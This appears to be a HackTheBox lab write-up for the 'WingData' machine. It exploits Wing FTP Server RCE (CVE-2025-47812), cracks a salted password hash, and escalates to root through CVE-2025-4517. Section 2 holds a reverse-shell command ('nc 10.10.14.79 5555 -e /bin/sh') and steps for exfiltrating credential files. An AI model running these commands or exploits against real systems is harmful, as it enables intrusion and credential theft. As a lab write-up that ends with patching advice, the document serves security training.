# HTB — WingData Writeup

> **Date:** April 21, 2026  
> **Platform:** HackTheBox  
> **Category:** Web / Network Penetration Testing  
> **Tags:** `Writeups` `Web` `HTB` `RCE` `PrivEsc` `CVE-2025-47812`

---

![WingData Banner](assets/images/WingData-1.png)

Hello security researchers! Welcome back to another walkthrough. In this writeup, we will tackle **WingData** from HackTheBox, demonstrating unauthenticated RCE via Wing FTP Server and local privilege escalation to root.

---

## 1. Reconnaissance & Initial Discovery

![Wing FTP Client Portal](assets/images/WingData-2.png)

During network enumeration, we discover a web portal running **Wing FTP Server**.

### FTP Server Details
- **Software:** Wing FTP Server v7.4.3
- **Known Vulnerability:** CVE-2025-47812 (Unauthenticated Remote Code Execution)

### Vulnerability Mechanics
Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution flaw (**CVE-2025-47812**). This issue arises from improper handling of `NULL` bytes in the `username` parameter during login, leading to Lua code injection into session files.

---

## 2. Exploitation & Initial Access

### Initial RCE & Directory Listing

Executing directory listing via the RCE vulnerability reveals the application root structure:

```text
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
```

*Note: Default SSH keys found in the web directory were not directly usable.*

### Credential Extraction

To search for sensitive files within restricted folders without direct shell access, we execute:

```bash
find Data -type f
```

We locate user configuration XML files (`Data/1/users/maria.xml`). To reliably extract the contents over the web shell payload, we base64-encode on the target and decode locally:

```bash
# On target
base64 Data/1/users/maria.xml

# Locally
base64 -d maria.b64 > maria.xml
```

### Spawning a Reverse Shell

For a fully interactive terminal session, we fire a Python exploit script targeting CVE-2025-47812:

1. **Start Local Netcat Listener:**
   ```bash
   nc -lvnp 5555
   ```

2. **Execute RCE Exploit Payload:**
   ```bash
   python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.79 5555 -e /bin/sh" -v
   ```

### System Users Enumeration

Inspecting `/etc/passwd`:

```text
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
_laurel:x:999:996::/var/log/laurel:/bin/false
```

Our target user for privilege escalation is **`wacky`**.

---

## 3. Pivot to User (`wacky`)

### Password Hash Extraction & Cracking

![Salt & Hash Configuration](assets/images/WingData-3.png)

We locate a settings file containing salted password hashes using SHA-256 with the static salt `"WingFTP"`.

We prepare the hash format for cracking:

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > salted_hash.txt
```

Cracking the hash reveals the credentials for `wacky`:

* **Username:** `wacky`
* **Password:** `!#7Blushing^*Bride5`

### SSH Access & User Flag

With valid user credentials, we authenticate via SSH:

```bash
ssh wacky@wingdata.htb
```

Retrieve the user flag:

```bash
cat ~/user.txt
```

---

## 4. Root Privilege Escalation

### Vulnerability Discovery

We enumerate current user privileges and `sudo` capabilities:

```bash
whoami
id
sudo -l
```

![Sudo Permissions Output](assets/images/WingData-4.png)

Enumeration highlights an unpatched local privilege escalation vulnerability (**CVE-2025-4517**).

### Exploitation to Root

1. **Transfer PoC Exploit to Target:**
   ```bash
   scp CVE-2025-4517-POC.py wacky@10.129.233.238:/tmp/
   ```

2. **Execute Local Escalation Exploit:**
   ```bash
   python3 /tmp/CVE-2025-4517-POC.py
   ```

3. **Gained Root Shell!**

### Root Flag

Retrieve the final root flag:

```bash
cat /root/root.txt
```

---

## 5. Summary & Key Takeaways

1. **Update Wing FTP Server:** Ensure Wing FTP Server is updated to version 7.4.4+ to remediate CVE-2025-47812 NULL byte RCE.
2. **Strong Passwords & Hashing:** Avoid using hardcoded static salts for user password hashes.
3. **Patch Sudo Binaries:** Apply OS updates to fix local privilege escalation vectors (CVE-2025-4517).

![Flag Captured](assets/images/WingData-5.png)
